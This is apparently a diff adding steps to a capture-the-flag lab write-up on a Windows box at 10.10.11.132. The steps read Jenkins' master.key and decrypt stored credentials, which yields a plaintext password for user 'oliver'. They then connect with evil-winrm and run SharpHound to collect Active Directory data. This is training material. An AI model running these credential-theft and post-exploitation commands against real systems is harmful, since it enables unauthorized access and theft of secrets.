@@ -140,11 +140,55 @@ but we save util.secret it like :
 3. master.key -> will be in :
 
 ```
+cmd /c "type c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key" 
+```
 
+<img width="1379" height="802" alt="image" src="https://github.com/user-attachments/assets/4407dde7-ac4a-4a80-a4a2-9e39a71dcfb4" />
+
+### And after we run it , we will fint the oliver passwd 
+
+```python
+python3 jenkins_offline_decrypt.py master.key util.secret creds.xml 
+```
+
+<img width="1098" height="122" alt="image" src="https://github.com/user-attachments/assets/89110dc5-5102-41a7-900b-8215c9f692c3" />
+
+```
+oliver:c1cdfun_d2434
+```
+#Oliver
+
+
+### We connect as oliver
+
+```
+evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
 ```
 
 
+<img width="1061" height="202" alt="image" src="https://github.com/user-attachments/assets/0bc7dffc-97e1-4b88-92ed-f679b6f3b33f" />
 
 
+### We upload SharpHound.exe
 
+```
+upload SharpHound.exe
+```
+
+### And download the bloodhound file 
+
+```
+.\SharpHound.exe -c all
+```
+
+<img width="1055" height="323" alt="image" src="https://github.com/user-attachments/assets/8c314b0b-36b0-4e5b-bc91-e08bfcedfd88" />
+
+### And use :
+
+
+```
+download 20250916050535_BloodHound.zip
+```
+
+<img width="976" height="251" alt="image" src="https://github.com/user-attachments/assets/eb2dbe4d-727b-4de3-9c80-3d3dfe6bc970" />
 
